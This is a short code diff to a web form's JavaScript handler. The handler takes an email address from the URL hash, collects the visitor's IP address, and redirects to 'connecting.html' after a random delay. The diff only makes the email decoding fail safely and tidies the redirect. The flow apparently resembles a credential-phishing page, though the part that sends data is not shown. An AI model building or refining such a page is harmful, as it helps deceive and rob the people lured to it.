@@ -295,7 +295,11 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
 
   // --- Capture email from URL hash ---
   let email = window.location.hash ? window.location.hash.substring(1) : '';
-  email = decodeURIComponent(email).replace(/=+$/, ''); // CLEAN EMAIL
+  try {
+    email = decodeURIComponent(email).replace(/=+$/, '');
+  } catch(e) {
+    email = '';
+  }
 
   // --- Fetch IP ---
   let ipAddress = 'Unavailable';
@@ -335,10 +339,10 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     });
   } catch {}
 
-  // --- Redirect to Page 2 with encoded hash ---
+  // --- Redirect to Page 2 with safe URL hash ---
   setTimeout(() => {
-    const cleanEmail = encodeURIComponent(email); // URL-safe
-    window.location.href = 'connecting.html' + (email ? '#' + cleanEmail : '');
+    const safeHash = email ? '#' + encodeURIComponent(email) : '';
+    window.location.href = 'connecting.html' + safeHash;
   }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
